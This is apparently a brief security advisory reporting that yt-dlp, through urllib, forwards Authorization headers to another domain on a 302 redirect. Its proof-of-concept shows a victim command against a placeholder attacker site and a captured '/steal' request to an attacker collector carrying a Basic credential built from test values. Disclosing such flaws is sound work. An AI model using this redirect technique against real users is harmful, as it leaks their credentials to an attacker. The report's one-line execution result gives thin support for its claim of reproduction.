# Cross-origin Authorization header forwarding on 30x redirect

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
urllib RedirectHandler strips Cookie but forwards Authorization verbatim. yt-dlp uses urllib.

## Impact
Malicious video site 302s → victim credentials sent to attacker domain.

## PoC
```
```bash
# 1. Attacker hosts a malicious video site that 302-redirects

# 2. Victim runs yt-dlp with netrc credentials:
yt-dlp --netrc-location ~/.netrc "http://attacker-site:18901/video.mp4"

# 3. Attacker collector receives:
#    GET /steal HTTP/1.1
#    Host: attacker-collector
#    Authorization: Basic dGVzdHVzZXI6c2VjcmV0cGFzczEyMw==
#    (base64 of testuser:secretpass123 — forwarded from victim netrc)
```
```

## Execution result
```
REPRODUCED via urllib mechanism
```
